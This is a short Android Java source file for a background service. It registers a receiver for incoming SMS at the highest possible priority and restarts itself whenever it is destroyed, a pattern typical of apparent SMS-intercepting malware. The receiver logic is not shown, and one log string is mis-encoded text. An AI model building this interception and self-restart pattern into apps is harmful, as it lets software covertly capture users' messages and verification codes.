package com.bobo.service;

import java.util.Date;

import com.google.code.microlog4android.Logger;
import com.google.code.microlog4android.LoggerFactory;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class MainService extends Service{
    MainReceiver mReceiver;
	private static final Logger logger = LoggerFactory.getLogger(MainService.class); 

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        logger.debug(new Date() + "service∆Ù∂Ø!!!");
        IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        localIntentFilter.setPriority(2147483647);
        mReceiver = new MainReceiver();
        registerReceiver(mReceiver, localIntentFilter);
        
    }

    @Override
    public void onDestroy() {
    	super.onDestroy();
        unregisterReceiver(mReceiver);
        Intent it = new Intent(MainService.this, MainService.class);
        this.startService(it);
    }
}